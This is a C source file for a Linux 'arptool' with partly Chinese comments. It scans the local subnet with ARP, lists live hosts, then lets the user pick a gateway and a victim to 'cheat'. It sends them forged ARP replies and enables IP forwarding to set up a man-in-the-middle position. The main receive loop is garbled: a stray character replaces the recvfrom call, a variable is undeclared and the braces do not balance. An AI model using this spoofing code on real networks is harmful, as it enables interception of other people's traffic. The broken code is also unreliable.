#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <sys/uio.h>
#include <sys/file.h>
#include <sys/time.h>
#include <sys/signal.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <linux/sockios.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_packet.h>
#include <linux/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//#define src_addr "192.168.1.119"
//#define device "eth0"
#define fill_buf "aaaaaaaaaaaa"

#define TYPE_DEFAULT 0
#define TYPE_PING 1
#define TYPE_CHEAT 2


int g_socketId;
int g_cmdType = TYPE_PING;

char device[6];
//char *target = src_addr;
int send_count = 0;
int recv_count = 0;
int checking = 1;
unsigned char local_mac[8];

struct in_addr g_src;
struct in_addr g_dst;
struct in_addr g_gatewall;

struct sockaddr_ll g_localLlAddr;
struct sockaddr_ll g_peerlLlAddr;

struct timeval send_time, recv_time;
struct alive{
    unsigned char al_mac[8];
    unsigned long al_ip;	
}aliving[254],*al;

struct in_addr get_src_ip(char *devices)
{
    socklen_t alen;
    struct sockaddr_in saddr;
    int sockId = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockId < 0)
    {
        perror("socket");
        exit(2);
    }
    if (devices)
    {
        if (setsockopt(sockId, SOL_SOCKET, SO_BINDTODEVICE, device, strlen(device) + 1) == -1)
            perror("WARNING: interface is ignored");
    }
    alen = sizeof(saddr);
    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_port = htons(0x1000);
    saddr.sin_family = AF_INET;
    if (connect(sockId, (struct sockaddr *)&saddr, sizeof(saddr)) == -1)
    {
        perror("connect");
        exit(2);
    }
    if (getsockname(sockId, (struct sockaddr *)&saddr, &alen) == -1)
    {
        perror("getsockname");
        exit(2);
    }
    close(sockId);
    return saddr.sin_addr;
}

//set the g_dst to xxx.xxx.xxx.0
void subnet_init()
{
    char *p,*p1;
        p = inet_ntoa(g_src);
	p1 = p; 
	char buf[3];
	int i,j;
	for(i=0,j=0;*p!=0;p++){
		if(i == 3){
			buf[j]=*p;
			j++;
			continue;		
		}
		if(*p == '.'){
			i++;		
		}		
	}
	p -= j;
	
	int ip = 0;
	
	sprintf(buf,"%d",ip);
	
	memcpy(p,buf,sizeof(buf));
	inet_aton(p1,&g_dst);

}

// check the goven dev name is or not exsit, if so, return the index
int check_device(char *if_dev, int ss)
{
    int ifindex;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, if_dev, IFNAMSIZ - 1);
    if (ioctl(ss, SIOCGIFINDEX, &ifr) < 0)
    {
        fprintf(stderr, "arping: unknown iface %s\n", if_dev);
        exit(2);
    }
    ifindex = ifr.ifr_ifindex;
    if (ioctl(ss, SIOCGIFFLAGS, (char *)&ifr))
    {
        perror("ioctl(SIOCGIFFLAGS)");
        exit(2);
    }
    if (!(ifr.ifr_flags & IFF_UP))
    {
        printf("Interface \"%s\" is down\n", if_dev);
        exit(2);
    }
    if (ifr.ifr_flags & (IFF_NOARP | IFF_LOOPBACK))
    {
        printf("Interface \"%s\" is not ARPable\n", if_dev);
        exit(2);
    }
    return ifindex;
}

int socket_init()
{
    socklen_t alen;
    int s, s_errno;
    s = socket(PF_PACKET, SOCK_DGRAM, 0);
    s_errno = errno;
    
    g_localLlAddr.sll_family = AF_PACKET;
    g_localLlAddr.sll_ifindex = check_device(device, s);
    g_localLlAddr.sll_protocol = htons(ETH_P_ARP);
    
    if (bind(s, (struct sockaddr *)&g_localLlAddr, sizeof(g_localLlAddr)) == -1)
    {
        perror("bind");
        exit(2);
    }
    alen = sizeof(g_localLlAddr);
    if (getsockname(s, (struct sockaddr *)&g_localLlAddr, &alen) == -1)
    {
        perror("getsockname");
        exit(2);
    }
    if (g_localLlAddr.sll_halen == 0)
    {
        printf("Interface \"%s\" is not ARPable (no ll address)\n", device);
        exit(2);
    }
    g_peerlLlAddr = g_localLlAddr;
    memset(g_peerlLlAddr.sll_addr, -1, g_peerlLlAddr.sll_halen); // set dmac addr FF:FF:FF:FF:FF:FF
    return s;
}

int createArpPkg(unsigned char *pkgBuf, struct in_addr src, struct in_addr dst,
        struct sockaddr_ll *FROM, struct sockaddr_ll *TO, int arpopType)
{
    struct arphdr *ah = (struct arphdr *)pkgBuf;
    unsigned char *p = (unsigned char *)(ah + 1);
    
    ah->ar_hrd = htons(FROM->sll_hatype);
    if (ah->ar_hrd == htons(ARPHRD_FDDI))
        ah->ar_hrd = htons(ARPHRD_ETHER);
    ah->ar_pro = htons(ETH_P_IP);
    ah->ar_hln = FROM->sll_halen;
    ah->ar_pln = 4;
    ah->ar_op = htons(arpopType);

    // fill the source mac into pkg
    memcpy(p, &FROM->sll_addr, ah->ar_hln);
    p += FROM->sll_halen;

    // fill the source ip into pkg
    memcpy(p, &src, 4);
    p += 4;

    // fill the destination mac into pkg
    memcpy(p, &TO->sll_addr, ah->ar_hln);
    p += ah->ar_hln;

    // fill the destination ip into pkg
    memcpy(p, &dst, 4);
    p += 4;
    
    memcpy(p, fill_buf, strlen(fill_buf));
    p += 12;
    return (p - pkgBuf); 
}

int check_net()
{
        char *p,*p1;
        p = inet_ntoa(g_dst);
	p1 = p; 
	char buf[3];
	int i,j;
	for(i=0,j=0;*p!=0;p++){
		if(i == 3){
			buf[j]=*p;
			j++;
			continue;		
		}
		if(*p == '.'){
			i++;		
		}		
	}
	p -= j;
	
	int ip = atoi(buf);
	ip++;
	if(ip == 255){
		//checking = 0;
		return -1;	
	}	
	sprintf(buf,"%d",ip);
	
	memcpy(p,buf,sizeof(buf));
	inet_aton(p1,&g_dst);	
	return 0;
}

void send_pkt(int i)
{   unsigned char *p;
    unsigned char send_buf[256];
    struct in_addr *pSrc;
    int arpopType;
    int pktSize;
    struct itimerval tick;
    tick.it_value.tv_sec = 0;  //十秒钟后将启动定时器
    tick.it_value.tv_usec = 20000;
    tick.it_interval.tv_sec  =0; //定时器启动后，每隔1秒将执行相应的函数
    tick.it_interval.tv_usec = 20000;

    if (g_cmdType == TYPE_DEFAULT || g_cmdType == TYPE_PING)
    {
        pSrc = &g_src;
        arpopType = ARPOP_REQUEST;
    }
    else
    {
        pSrc = &g_gatewall;
        arpopType = ARPOP_REPLY;
    }
    if(check_net()!=-1)
    {
    pktSize = createArpPkg(send_buf, *pSrc, g_dst, &g_localLlAddr, &g_peerlLlAddr, arpopType);
    
    gettimeofday(&send_time, NULL);
    int cc = sendto(g_socketId, send_buf, pktSize, 0, (struct sockaddr *)&g_peerlLlAddr, sizeof(g_peerlLlAddr));
    if (cc == pktSize)
        send_count++;
    printf("ARPING %s \n", inet_ntoa(g_dst));
    //alarm(1);

    //setitimer将触发SIGALRM信号
    int ret = setitimer(ITIMER_REAL, &tick, NULL);
    
    }else {
     alarm(0);     
     checking = 0;
     }
}

int check_al(unsigned long ip)
{
    struct alive *p = aliving;
    while(p->al_ip!=0)
    {
         if( ip == p->al_ip )
                return -1;
         p++;
    }
    return 0;
}

unsigned long chk_recv_pkt(unsigned char *buf, struct sockaddr_ll *FROM)
{
    struct arphdr *ah = (struct arphdr *)buf;
    unsigned char *p = (unsigned char *)(ah + 1);
    struct in_addr src_ip, dst_ip;
    if (ah->ar_op != htons(ARPOP_REQUEST) && ah->ar_op != htons(ARPOP_REPLY))
        return 0;
    if (ah->ar_pro != htons(ETH_P_IP) || ah->ar_pln != 4 || ah->ar_hln != g_localLlAddr.sll_halen)
        return 0;
    memcpy(&src_ip, p + ah->ar_hln, 4);
    memcpy(&dst_ip, p + ah->ar_hln + 4 + ah->ar_hln, 4);
    if (g_src.s_addr != dst_ip.s_addr)
    //if (g_src.s_addr != dst_ip.s_addr || g_dst.s_addr != src_ip.s_addr)
        return 0;
    if(check_al(src_ip.s_addr) !=-1 )
    {
        al->al_ip = src_ip.s_addr;
        memcpy(al->al_mac,FROM->sll_addr,FROM->sll_halen);
        al++;
    }
    //return (p - buf);
    return src_ip.s_addr;
}

//print arp packet info
void disp_info(int received, struct in_addr g_dst, int msecs, int usecs, struct sockaddr_ll from)
{
    printf("%03d ", received);
    printf("%s ", from.sll_pkttype == PACKET_HOST ? "Unicast" : "Broadcast");
    printf("%s from %s", "reply", inet_ntoa(g_dst));
    printf(" [%02X:%02X:%02X:%02X:%02X:%02X] ", from.sll_addr[0], from.sll_addr[1],
           from.sll_addr[2], from.sll_addr[3], from.sll_addr[4], from.sll_addr[5]);
    printf(" %ld.%ld ms\n", (long int)msecs, (long int)usecs);
    fflush(stdout);
}


void cheat(int i)
{ 
    unsigned char *p;
    unsigned char send_buf[256];
    int arpopType;
    int pktSize;
    struct in_addr temp_ip;
    unsigned char temp_ll[8];
    arpopType = ARPOP_REPLY;
    pktSize = createArpPkg(send_buf, g_src, g_dst, &g_localLlAddr, &g_peerlLlAddr, arpopType);
    
    gettimeofday(&send_time, NULL);
    int cc = sendto(g_socketId, send_buf, pktSize, 0, (struct sockaddr *)&g_peerlLlAddr, sizeof(g_peerlLlAddr));
    if (cc == pktSize){
	temp_ip = g_dst;
        g_dst = g_src;
        g_src = temp_ip;
        
        if(i!=1)
        {
	    memcpy(temp_ll, g_peerlLlAddr.sll_addr, g_peerlLlAddr.sll_halen);
            memcpy(g_peerlLlAddr.sll_addr, local_mac, g_peerlLlAddr.sll_halen);
	    memcpy(local_mac, temp_ll, g_peerlLlAddr.sll_halen);
        }else
        {
	    memcpy(temp_ll, g_peerlLlAddr.sll_addr, g_peerlLlAddr.sll_halen);
            memcpy(g_peerlLlAddr.sll_addr, g_localLlAddr.sll_addr, g_peerlLlAddr.sll_halen);
	    memcpy(g_localLlAddr.sll_addr, temp_ll, g_peerlLlAddr.sll_halen);	
	}
	send_count++;
        gettimeofday(&recv_time, NULL);
        long usecs, msecs;
            if (recv_time.tv_sec)
            {
                usecs =
                    (recv_time.tv_sec - send_time.tv_sec) * 1000000 + recv_time.tv_usec -
                    send_time.tv_usec;
                msecs = (usecs + 500) / 1000;
                usecs -= msecs * 1000 - 500;
            } 
        disp_info(send_count, g_dst, msecs, usecs, g_peerlLlAddr);
        if(i!=1)        
	alarm(1);
   } 
}

//show how many pkgs we got and sent when cut the program
void finish(int a)
{ 
    int i;
    int num1,num2;
    struct alive *b = aliving;
    printf("\nSent %d ARP %s packet(s) \n", send_count, (g_cmdType == TYPE_CHEAT) ? "reply":"requst");
    printf("Received %d response(s)\n", recv_count);
    printf("alive in subnet:\n");
    for(i=0;i<254&&b->al_ip!=0;b++,i++)
    {
        printf("%d:",i);
        printf("ip:%s\t",inet_ntoa(*(struct in_addr*)&b->al_ip));
        printf("mac:[%02X:%02X:%02X:%02X:%02X:%02X] ", b->al_mac[0], b->al_mac[1],
           b->al_mac[2], b->al_mac[3], b->al_mac[4], b->al_mac[5]);
        if(i==0)
        {
       	    printf("\tprobably the gatewall~");
        }
	printf("\n");
    }
    printf("\n");
    fflush(stdout);

    if(a != 1)
         exit(!recv_count);
    while(1){
	printf("Please select a number of gatewall and your dst host you wanna cheat!(eg:1,3).\n");
	if(scanf("%d,%d",&num1,&num2) !=2)
        {
        	perror("wrong number foramt!");
        }
    	else if(num1 == num2)
    	{
    		perror("can't be the same!");
    	}else if(aliving[num1].al_ip == 0 || aliving[num2].al_ip == 0 || num1 < 0 || num2 < 0)
    	{
    		perror("number error");
    	}else
    	{
        	break;
    	}
    }
    g_dst = *(struct in_addr*)&aliving[num1].al_ip;
    memcpy(g_peerlLlAddr.sll_addr, aliving[num1].al_mac, g_peerlLlAddr.sll_halen);
    //printf("Please select a number of one host which you wanna arp cheat?\n");    
    
    //scanf("%d",&num);
    g_src = *(struct in_addr*)&aliving[num2].al_ip;
    
    //memcpy(local_mac, g_localLlAddr.sll_addr, g_peerlLlAddr.sll_halen);
    memcpy(local_mac, aliving[num2].al_mac, g_peerlLlAddr.sll_halen);  
    
}

void clean_up(int i)
{   
    printf("\ncleaning up and rearping ^_^\n");
    memcpy(g_localLlAddr.sll_addr, local_mac, g_peerlLlAddr.sll_halen);
    for(i=0;i<10;i++)
        cheat(1);
    
//sleep(10);
    exit(0);
}

static void showUsage()
{
    printf("usage:\n\tarptool\n\t-i [inerface] \n\t-h [help]\n");
}

struct option g_opts[] = {
    //{"ping", required_argument, NULL, 'p'},
    {"interface", required_argument, NULL, 'i'},
    //{"gatewall", required_argument, NULL, 'g'},
    {"help", no_argument, NULL, 'h'}
};


////////////////////////////////////////////////////////////////
int main(int argc, char **argv)
{
    uid_t euid = geteuid();
    uid_t uid = getuid();
    char *cmdstr;
    int opt = 0;
    int ret;
    
    if (euid != 0)
    {
        printf("Run this program under root privilege!\n");
        return 0;
    }
    
    setuid(euid);

    if (argc < 2)
    {
        showUsage();
        return 0;
    }

    while ((opt = getopt_long(argc, argv, "i:h", g_opts, NULL)) != -1) {
        switch (opt) {
        case 'i':
	    memset(device, 0, sizeof(device));
            memcpy(device, optarg, sizeof(optarg)); 
            break;
        case 'h':
            showUsage();
            return 0;
            break;
        default:
            showUsage();
            return -1;
        }
    }
#if 0
if (inet_aton(dstIPStr, &g_dst) != 1)
    {
        struct hostent *hp;
        hp = gethostbyname2(target, AF_INET);
        printf("\ntarget = %s \n", target);
        if (!hp)
        {
            fprintf(stderr, "arping: unknown host %s\n", target);
            exit(2);
        }
        memcpy(&g_dst, hp->h_addr, 4);
    }
#endif
    g_src = get_src_ip(device);
    if (!g_src.s_addr)
    {
        fprintf(stderr, "arping: no source address in not-DAD mode\n");
        exit(2);
    }
    subnet_init();
    g_socketId = socket_init();
    //clear
    memset(aliving,0,sizeof(aliving));
    al = aliving;
    //printf("\nARPING %s ", inet_ntoa(g_dst));
    //printf("from %s %s\n\n", inet_ntoa(g_src), device ? : "");
    signal(SIGINT, finish);
    signal(SIGALRM, send_pkt);
    printf("checking alive host...\n");
    send_pkt(0);
    
    while (checking)
    {
        struct sockaddr_ll from;
        socklen_t alen = sizeof(from);
        char recv_buf[0x1000];

        //set timeout is very important!cuz recvfrom is a blocking i/o operation 
        o
        gettimeofday(&recv_time, NULL);
        if (recv_size < 0)
        {
            perror("arping: recvfrom");
            continue;
        }
        unsigned long ip= chk_recv_pkt((unsigned char*)recv_buf, &from);
        if (ip > 0)
        {
	    //printf("%s\n",inet_ntoa());
	    //if(ip == inet_addr(src_addr))
            //memcpy(g_peerlLlAddr.sll_addr, from.sll_addr, g_peerlLlAddr.sll_halen);
            long usecs, msecs;
            if (recv_time.tv_sec)
            {
                usecs =
                    (recv_time.tv_sec - send_time.tv_sec) * 1000000 + recv_time.tv_usec -
                    send_time.tv_usec;
                msecs = (usecs + 500) / 1000;
                usecs -= msecs * 1000 - 500;
            }
            recv_count++;
            disp_info(recv_count, *(struct in_addr*)&ip, msecs, usecs, from);
        }
	}
	}

    }
     printf("done!");
     finish(1);
     send_count = 0; 
     g_cmdType = 2;
     signal(SIGALRM, cheat);
     signal(SIGINT,clean_up);
     // open ip_forward
     system("echo 1 > /proc/sys/net/ipv4/ip_forward");
     cheat(0);
     while(1);

    return 0;
}
